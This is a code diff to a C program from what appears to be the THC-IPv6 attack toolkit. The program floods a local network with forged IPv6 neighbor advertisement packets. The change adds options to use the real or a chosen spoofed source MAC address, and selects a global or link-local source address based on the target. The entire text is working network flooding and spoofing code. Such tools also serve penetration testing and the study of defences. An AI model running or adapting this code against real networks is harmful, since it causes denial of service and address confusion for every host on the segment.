@@ -11,9 +11,10 @@
 #include "thc-ipv6.h"
 
 void help(char *prg) {
-  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s interface [target]\n\n", prg);
+  printf("%s %s (c) 2014 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("Syntax: %s [-k | -m mac] interface [target]\n\n", prg);
   printf("Flood the local network with neighbor advertisements.\n");
+  printf("Option -k sends with your real src mac, -m with a specified src mac, random for each packet otherwise.\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
@@ -21,18 +22,30 @@ void help(char *prg) {
 int main(int argc, char *argv[]) {
   char *interface, mac[6] = "";
   unsigned char *mac6 = mac, *ip6;
-  unsigned char buf[24];
+  unsigned char buf[24], srcmac[8] = "", *smac = NULL;
   unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst);
   int i;
   unsigned char *pkt = NULL;
-  int pkt_len = 0, flags, rawmode = 0, count = 0;
+  int pkt_len = 0, flags, rawmode = 0, count = 0, prefer = PREFER_LINK, keepmac = 0;
 
-  if (argc > 1 && strcmp(argv[1], "-r") == 0) {
-    thc_ipv6_rawmode(1);
-    rawmode = 1;
+  if (argc > 2 && strncmp(argv[1], "-k", 2) == 0) {
+    keepmac = 1;
+    if ((smac = thc_get_own_mac(argv[2])) == NULL) {
+      fprintf(stderr, "Error: invalid interface %s\n", argv[2]);
+      exit(-1);
+    }
     argv++;
     argc--;
   }
+  if (argc > 2 && strncmp(argv[1], "-m", 2) == 0) {
+    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", (unsigned int *) &srcmac[0], (unsigned int *) &srcmac[1], (unsigned int *) &srcmac[2], (unsigned int *) &srcmac[3],
+           (unsigned int *) &srcmac[4], (unsigned int *) &srcmac[5]);
+    smac = srcmac;
+    argv+=2;
+    argc-=2;
+  }
+  if (smac != NULL)
+    mac6 = smac;
 
   if (argc < 2 || argc > 4 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
@@ -45,19 +58,20 @@ int main(int argc, char *argv[]) {
     fprintf(stderr, "Error: invalid interface %s\n", interface);
     exit(-1);
   }
-  if (argc == 3)
+  if (argc == 3) {
     if ((dst = thc_resolve6(argv[2])) == NULL) {
       fprintf(stderr, "Error: invalid target IPv6 address\n");
       exit(-1);
     }
+    if (dst[0] >= 0x20 && dst[0] <= 0xfd)
+      prefer = PREFER_GLOBAL;
+  }
 
-  ip6 = malloc(16);
+  ip6 = thc_get_own_ipv6(interface, dst, prefer);
 
   mac[0] = 0x00;
   mac[1] = 0x18;
-  memset(ip6, 0, 16);
-  ip6[0] = 0xfe;
-  ip6[1] = 0x80;
+  memset(ip6 + 8, 0, 8);
   ip6[8] = 0x02;
   ip6[9] = mac[1];
   ip6[11] = 0xff;
@@ -86,7 +100,7 @@ int main(int argc, char *argv[]) {
     memcpy(buf + 10, ip6 + 10, 6);
     memcpy(&buf[20], mac + 2, 4);
 
-    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
+    if ((pkt = thc_create_ipv6_extended(interface, prefer, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
       return -1;
     if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, flags, buf, sizeof(buf), 0) < 0)
       return -1;
